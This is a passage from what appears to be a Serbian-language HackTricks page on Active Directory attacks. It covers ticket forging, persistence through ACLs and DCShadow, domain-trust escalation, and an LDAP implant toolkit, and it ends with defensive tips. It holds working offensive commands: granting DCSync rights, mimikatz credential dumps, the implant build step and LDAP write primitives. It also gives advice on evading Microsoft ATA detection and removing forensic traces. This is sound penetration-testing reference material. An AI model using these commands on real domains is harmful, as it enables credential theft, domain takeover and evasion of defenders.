- Dodeliti [**DCSync**](#dcsync) privilegije korisniku

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Silver Ticket attack kreira legitimnu Ticket Granting Service (TGS) kartu za određeni servis koristeći **NTLM hash** (na primer, **hash PC account-a**). Ova metoda se koristi za pristup privilegijama servisa.

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Golden Ticket attack podrazumeva da napadač dobije pristup **NTLM hash**-u **krbtgt account** u Active Directory okruženju. Taj nalog se koristi za potpisivanje svih **Ticket Granting Tickets (TGTs)**, koji su ključni za autentikaciju unutar AD mreže.

Kada napadač dobije ovaj hash, može da kreira **TGTs** za bilo koji nalog po izboru (Silver ticket attack).

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ovo su poput Golden Ticket-ova, ali falsifikovani na način koji **zaobilazi uobičajene mehanizme detekcije za Golden Ticket**.

{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Imati sertifikate naloga ili biti u mogućnosti da ih zahtevaš** je veoma dobar način da se zadrži pristup korisničkom nalogu (čak i ako korisnik promeni lozinku):

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Korišćenjem sertifikata takođe je moguće zadržati visoke privilegije unutar domena:**

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Objekat **AdminSDHolder** u Active Directory obezbeđuje sigurnost **privilegovanih grupa** (kao što su Domain Admins i Enterprise Admins) primenom standardnog **Access Control List (ACL)** preko ovih grupa kako bi se sprečile neovlašćene izmene. Međutim, ova zaštita se može zloupotrebiti; ako napadač izmeni AdminSDHolder-ov ACL kako bi dao potpuni pristup običnom korisniku, taj korisnik dobija široku kontrolu nad svim privilegovanim grupama. Ova mera, zamišljena da štiti, može se obiti o glavu ako se ne prati pažljivo.

[**Više informacija o AdminDSHolder Group ovde.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Unutar svakog **Domain Controller (DC)** postoji lokalni administrator nalog. Dobijanjem admin prava na takvoj mašini, lokalni Administrator hash može se izvući koristeći **mimikatz**. Nakon toga je potrebna izmena registra da bi se omogućilo korišćenje te lozinke, omogućavajući udaljeni pristup lokalnom Administrator nalogu.

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Možete **dodeliti** neke **specijalne permisije** korisniku nad određenim domain objektima koje će mu omogućiti **escalate privileges u budućnosti**.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** se koriste za **čuvanje** **permissions** koje **objekat** ima **nad** nekim resursom. Ako možete napraviti i **mali izmen**u u **security descriptor**-u objekta, možete dobiti veoma interesantne privilegije nad tim objektom bez potrebe da budete član privilegovane grupe.

{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Zloupotrebite `dynamicObject` auxiliary class da kreirate kratkotrajne principe/GPO/DNS zapise sa `entryTTL`/`msDS-Entry-Time-To-Die`; sami se brišu bez tombstones, brišu LDAP dokaze ostavljajući orphan SIDs, broken `gPLink` reference, ili keširane DNS odgovore (npr. AdminSDHolder ACE pollution ili maliciozni `gPCFileSysPath`/AD-integrisani DNS redirecti).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Izmenite **LSASS** u memoriji da uspostavite **univerzalnu lozinku**, što omogućava pristup svim domain nalozima.

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možete napraviti svoj **own SSP** da **capture** u **clear text** kredencijale korišćene za pristup mašini.

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registruje novi **Domain Controller** u AD i koristi ga da **push attributes** (SIDHistory, SPNs...) na određene objekte **bez** ostavljanja **logova** o izmenama. Potrebne su **DA** privilegije i pristup **root domain**-u.\
Napomena: ako unesete pogrešne podatke, pojaviće se prilično ružni logovi.

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Ranije smo diskutovali o tome kako eskalirati privilegije ako imate dovoljno permisija da pročitate LAPS passwords. Međutim, ove lozinke takođe mogu biti korišćene za **održavanje persistance**.\
Pogledajte:

{{#ref}}
laps.md
{{#endref}}

## Eskalacija privilegija u Forest-u - Domain Trusts

Microsoft smatra **Forest** sigurnosnom granicom. To implicira da **kompromitovanje jednog domena može dovesti do kompromitovanja celog Foresta**.

### Osnovne informacije

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) je sigurnosni mehanizam koji omogućava korisniku iz jednog **domena** da pristupi resursima u drugom **domenu**. To u suštini stvara vezu između autentikacionih sistema ta dva domena, omogućavajući da autentikacioni zahtevi prolaze bez problema. Kada domeni uspostave trust, oni razmenjuju i čuvaju određene **ključeve** unutar svojih **Domain Controllers (DCs)**, koji su ključni za integritet trust-a.

U tipičnom scenariju, ako korisnik želi pristup servisu u **trusted domain**, mora prvo zatražiti specijalnu kartu poznatu kao **inter-realm TGT** od svog domen kontrolera. Ovaj TGT je enkriptovan sa zajedničkim **ključem** koji su oba domena dogovorila. Zatim korisnik predstavlja ovaj TGT **DC-u trusted domena** da bi dobio servisnu kartu (**TGS**). Nakon uspešne verifikacije inter-realm TGT-a od strane DC-a trusted domena, taj DC izdaje TGS, dodeljujući korisniku pristup servisu.

**Koraci**:

1. Klijent računar u **Domain 1** pokreće proces koristeći svoj **NTLM hash** da zatraži **Ticket Granting Ticket (TGT)** od svog **Domain Controller (DC1)**.
2. DC1 izdaje novi TGT ako je klijent uspešno autentifikovan.
3. Klijent zatim zatraži **inter-realm TGT** od DC1, koji je potreban za pristup resursima u **Domain 2**.
4. Inter-realm TGT je enkriptovan sa **trust key** koji DC1 i DC2 dele kao deo dvosmernog domain trust-a.
5. Klijent nosi inter-realm TGT do **Domain 2's Domain Controller (DC2)**.
6. DC2 verifikuje inter-realm TGT koristeći svoj shared trust key i, ako je validan, izdaje **Ticket Granting Service (TGS)** za server u Domain 2 kojem klijent želi da pristupi.
7. Na kraju, klijent prezentuje ovaj TGS serveru, koji je enkriptovan sa server-ovim account hash-om, kako bi dobio pristup servisu u Domain 2.

### Different trusts

Važno je napomenuti da **trust može biti jednosmeran ili dvosmeran**. U dvosmernoj opciji oba domena će se međusobno verovati, ali u **jednosmernom** odnosu poverenja jedan od domena će biti **trusted**, a drugi **trusting** domain. U tom slučaju, **moći ćete pristupiti resursima samo unutar trusting domena iz trusted domena**.

Ako Domain A trustuje Domain B, A je trusting domain, a B je trusted domain. Nadalje, u **Domain A** to bi bio **Outbound trust**; a u **Domain B** to bi bio **Inbound trust**.

**Različiti odnosi poverenja**

- **Parent-Child Trusts**: Uobičajena konfiguracija unutar istog foresta, gde child domen automatski ima dvosmeran transitive trust sa parent domenom. To znači da autentikacioni zahtevi mogu neometano da teku između parent i child domena.
- **Cross-link Trusts**: Nazvani i "shortcut trusts", uspostavljaju se između child domena radi ubrzanja referal procesa. U kompleksnim forest-ovima, autentikacioni referali obično moraju da idu do root-a foresta pa zatim dole do ciljnog domena. Cross-link trusts skraćuju taj put, što je naročito korisno u geografski disperzovanim okruženjima.
- **External Trusts**: Postavljaju se između različitih, nepovezanih domena i po prirodi su non-transitive. Prema [Microsoft dokumentaciji](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts su korisni za pristup resursima u domenu van trenutnog foresta koji nije povezan forest trust-om. Sigurnost se pojačava kroz SID filtering sa external trusts.
- **Tree-root Trusts**: Ovi trust-ovi se automatski uspostavljaju između forest root domena i novododatog tree root-a. Iako nisu često nađeni, tree-root trusts su važni za dodavanje novih domain tree-ova u forest, omogućavajući im da zadrže jedinstveno ime domena i osiguravaju dvosmernu transitive prirodu. Više informacija je u [Microsoft vodiču](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ova vrsta trust-a je dvosmeran transitive trust između dva forest root domena, takođe primenjujući SID filtering da pojača bezbednosne mere.
- **MIT Trusts**: Ovi trust-ovi se uspostavljaju sa non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domenima. MIT trusts su specijalizovaniji i namenjeni okruženjima koja zahtevaju integraciju sa Kerberos sistemima van Windows ekosistema.

#### Druge razlike u odnosima poverenja

- Odnos poverenja može biti i **transitive** (A trustuje B, B trustuje C, onda A trustuje C) ili **non-transitive**.
- Odnos poverenja može biti postavljen kao **bidirectional trust** (oba se međusobno veruju) ili kao **one-way trust** (samo jedan od njih veruje drugom).

### Putanja napada

1. **Enumerišite** odnose poverenja
2. Proverite da li neki **security principal** (user/group/computer) ima **access** na resurse drugog domena — možda kroz ACE unose ili članstvo u grupama drugog domena. Tražite **relationships across domains** (trust je verovatno kreiran za ovo).
1. Kerberoast u ovom slučaju može biti još jedna opcija.
3. **Kompromitujte** naloge koji mogu **pivot**-ovati kroz domene.

Napadači mogu dobiti pristup resursima u drugom domenu kroz tri glavna mehanizma:

- **Local Group Membership**: Principali mogu biti dodati u lokalne grupe na mašinama, kao što je “Administrators” grupa na serveru, što im daje znatnu kontrolu nad tom mašinom.
- **Foreign Domain Group Membership**: Principali takođe mogu biti članovi grupa unutar stranog domena. Međutim, efikasnost ove metode zavisi od prirode trust-a i opsega grupe.
- **Access Control Lists (ACLs)**: Principali mogu biti navedeni u **ACL**-u, posebno kao entiteti u **ACEs** unutar **DACL**-a, dajući im pristup specifičnim resursima. Za one koji žele dublje da prouče mehaniku ACL-ova, DACL-ova i ACE-ova, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” je neprocenjiv resurs.

### Pronađite eksternе korisnike/grupe sa permisijama

Možete proveriti `CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com` da pronađete foreign security principals u domenu. Ovo će biti korisnici/grupe iz **eksternog domena/foresta**.

Možete proveriti ovo u **Bloodhound** ili koristeći **powerview**:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Drugi načini za enumerate domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Postoje **2 trusted keys**, jedan za _Child --> Parent_ i drugi za _Parent_ --> _Child_.\
> Možete videti koji se koristi u trenutnom domenu pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Povišavanje do Enterprise admin-a u child/parent domenu zloupotrebom trust-a putem SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Razumevanje kako se Configuration Naming Context (NC) može iskoristiti je ključno. Configuration NC služi kao centralni repozitorijum za konfiguracione podatke kroz forest u Active Directory (AD) okruženjima. Ti podaci se repliciraju na svaki Domain Controller (DC) u forestu, pri čemu writable DCs održavaju zapisivu kopiju Configuration NC. Da biste ovo iskoristili, potrebno je imati **SYSTEM privileges on a DC**, po mogućstvu child DC.

**Link GPO to root DC site**

Configuration NC-ov Sites container sadrži informacije o site-ovima svih računa pridruženih domenu unutar AD foresta. Radeći sa SYSTEM privilegijama na bilo kojem DC-u, napadači mogu linkovati GPOs na root DC sites. Ova akcija potencijalno kompromituje root domain manipulacijom policy-ja koji se primenjuju na te site-ove.

For detaljnije informacije, možete istražiti istraživanje o [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Vektor napada uključuje ciljanja privilegovanih gMSA unutar domena. KDS Root key, neophodan za računanje lozinki za gMSAs, je uskladišten unutar Configuration NC. Sa SYSTEM privilegijama na bilo kojem DC-u, moguće je pristupiti KDS Root key i izračunati lozinke za bilo koji gMSA kroz forest.

Detaljna analiza i korak-po-korak vodič mogu se naći u:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Komplementarni delegated MSA napad (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatno eksterno istraživanje: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Ova metoda zahteva strpljenje, čekanje na kreiranje novih privilegovanih AD objekata. Sa SYSTEM privilegijama, napadač može izmeniti AD Schema kako bi dao bilo kojem korisniku kompletna prava nad svim klasama. To može dovesti do neautorizovanog pristupa i kontrole nad novokreiranim AD objektima.

Dalje čitanje dostupno je na [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 ranjivost cilja kontrolu nad Public Key Infrastructure (PKI) objektima kako bi kreirala certificate template koji omogućava autentifikaciju kao bilo koji korisnik unutar foresta. Pošto PKI objekti žive u Configuration NC, kompromitovanje writable child DC omogućava izvođenje ESC5 napada.

Više detalja o ovome može se pročitati u [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). U scenarijima bez ADCS, napadač ima mogućnost da postavi potrebne komponente, kao što je diskutovano u [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
U ovom scenariju **vaš domen je trusted** od strane eksternog, dajući vam **neodređena ovlašćenja** nad njim. Treba da otkrijete **koji principals vašeg domena imaju koji pristup eksternom domenu** i potom pokušate da to iskoristite:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterni forest domen - Jednosmerno (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
U ovom scenariju **vaš domen** **dodeljuje** neke **privilegije** bezbednosnom subjektu iz **drugog domena**.

Međutim, kada je **domain is trusted** od strane trustujućeg domena, povereni domen **kreira korisnika** sa **predvidljivim imenom** koji kao **lozinku koristi lozinku poverenja**. To znači da je moguće **iskoristiti korisnika iz trustujućeg domena da se uđe u povereni domen** radi enumeracije i pokušaja eskalacije privilegija:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Drugi način kompromitovanja poverenog domena je pronalaženje [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiranog u **suprotnom smeru** domain trusta (što nije često).

Još jedan način kompromitovanja poverenog domena je čekanje na mašini gde se **korisnik iz poverenog domena može prijaviti** putem **RDP**. Tada napadač može ubaciti kod u proces RDP sesije i **pristupiti izvornom domenu žrtve** odatle.  
Štaviše, ako je **žrtva montirala svoj hard disk**, iz procesa **RDP sesije** napadač može smestiti **backdoors** u **startup folder of the hard drive**. Ova tehnika se zove **RDPInception.**

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ublažavanje zloupotrebe trusta domena

### **SID Filtering:**

- Rizik od napada koji koriste SID history atribut preko trustova između šuma ublažava SID Filtering, koji je podrazumevano aktiviran na svim inter-forest trusts. Ovo se zasniva na pretpostavci da su intra-forest trusts bezbedni, smatrajući šumu, a ne domen, bezbednosnom granicom u skladu sa Microsoft-ovim stanovištem.
- Međutim, postoji problem: SID filtering može ometati aplikacije i pristup korisnika, što dovodi do povremenog isključivanja.

### **Selective Authentication:**

- Za trustove između šuma, primena Selective Authentication osigurava da korisnici iz ta dva šuma nisu automatski autentifikovani. Umesto toga, potrebne su eksplicitne dozvole da bi korisnici pristupili domenima i serverima unutar trustujućeg domena ili šume.
- Važno je napomenuti da ove mere ne štite od zloupotrebe writable Configuration Naming Context (NC) ili napada na trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Zloupotreba AD-a zasnovana na LDAP iz implantata na hostu

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implementira bloodyAD-style LDAP primitives kao x64 Beacon Object Files koje se izvršavaju u potpunosti unutar on-host implantata (npr. Adaptix C2). Operateri kompajliraju paket sa `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, učitaju `ldap.axs`, i potom pozovu `ldap <subcommand>` iz beacona. Sav saobraćaj koristi trenutni kontekst bezbednosti prijave preko LDAP (389) sa signing/sealing ili LDAPS (636) sa auto certificate trust, tako da nisu potrebni socks proxyji niti disk artefakti.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` prevode kratka imena/OU putanje u pune DNs i ispisuju odgovarajuće objekte.
- `get-object`, `get-attribute`, and `get-domaininfo` vlače proizvoljne atribute (uključujući security descriptors) plus metapodatke šume/domena iz `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` otkrivaju roasting candidates, delegation settings, i postojeće [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) deskriptore direktno iz LDAP-a.
- `get-acl` and `get-writable --detailed` parsiraju DACL da navedu trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), i naslednost, dajući trenutne ciljeve za ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) omogućavaju operatoru da postavi nove principe ili mašinske naloge gde god postoje prava nad OU. `add-groupmember`, `set-password`, `add-attribute`, and `set-attribute` direktno preuzimaju ciljeve kada su pronađena write-property prava.
- Komande fokusirane na ACL kao što su `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, i `add-dcsync` prevode WriteDACL/WriteOwner na bilo kom AD objektu u reset lozinki, kontrolu članstva u grupama ili DCSync privilegije replikacije bez ostavljanja PowerShell/ADSI artefakata. `remove-*` kontra-komande uklanjaju ubrizgane ACEs.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` odmah čine kompromitovanog korisnika Kerberoastable; `add-asreproastable` (UAC toggle) označava korisnika za AS-REP roasting bez diranja lozinke.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) prepisuju `msDS-AllowedToDelegateTo`, UAC flags, ili `msDS-AllowedToActOnBehalfOfOtherIdentity` iz beacon-a, omogućavajući constrained/unconstrained/RBCD puteve napada i eliminišući potrebu za udaljenim PowerShell ili RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` ubrizgava privilegovane SID-ove u SID history kontrolisanog principala (see [SID-History Injection](sid-history-injection.md)), pružajući prikriveno nasledjivanje pristupa potpuno preko LDAP/LDAPS.
- `move-object` menja DN/OU računara ili korisnika, dopuštajući napadaču da premesti resurse u OU-e gde već postoje delegirana prava pre zloupotrebe `set-password`, `add-groupmember`, ili `add-spn`.
- Naredbe za uklanjanje sa uskim opsegom (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, itd.) omogućavaju brz rollback nakon što operator sakuplja kredencijale ili perzistenciju, minimizirajući telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Preporučuje se da Domain Admins budu dozvoljeni za prijavu samo na Domain Controllers, izbegavajući njihovu upotrebu na drugim hostovima.
- **Service Account Privileges**: Servisi ne bi trebalo da se pokreću sa Domain Admin (DA) privilegijama radi očuvanja bezbednosti.
- **Temporal Privilege Limitation**: Za zadatke koji zahtevaju DA privilegije, trajanje tih privilegija treba ograničiti. Ovo se može postići komandom: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Auditujte Event ID-ove 2889/3074/3075 i potom forsirajte LDAP signing plus LDAPS channel binding na DC-jevima/klijentima da biste blokirali LDAP MITM/relay pokušaje.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Implementacija decepcije uključuje postavljanje zamki, kao što su decoy korisnici ili računari, sa karakteristikama poput lozinki koje ne ističu ili su označeni kao Trusted for Delegation. Detaljan pristup uključuje kreiranje korisnika sa specifičnim pravima ili dodavanje u grupe visokih privilegija.
- Praktičan primer uključuje korišćenje alata kao što su: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više o deploy-deception tehnikama možete pronaći na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Sumnjivi indikatori uključuju netipičan ObjectSID, retke logone, datume kreiranja i nizak broj neuspelih pokušaja lozinke.
- **General Indicators**: Poređenje atributa potencijalnih decoy objekata sa onima kod legitimnih objekata može otkriti nedoslednosti. Alati kao što je [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogu pomoći u identifikaciji takvih decepija.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Izbegavanje enumeracije sesija na Domain Controller-ima kako bi se sprečilo ATA detektovanje.
- **Ticket Impersonation**: Korišćenje **aes** ključeva za kreiranje tiketa pomaže u izbegavanju detekcije jer ne dolazi do degradacije na NTLM.
- **DCSync Attacks**: Preporučuje se izvršavanje sa ne-Domain Controller-a da bi se izbegla ATA detekcija, jer direktno izvršenje sa Domain Controller-a izaziva alarme.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
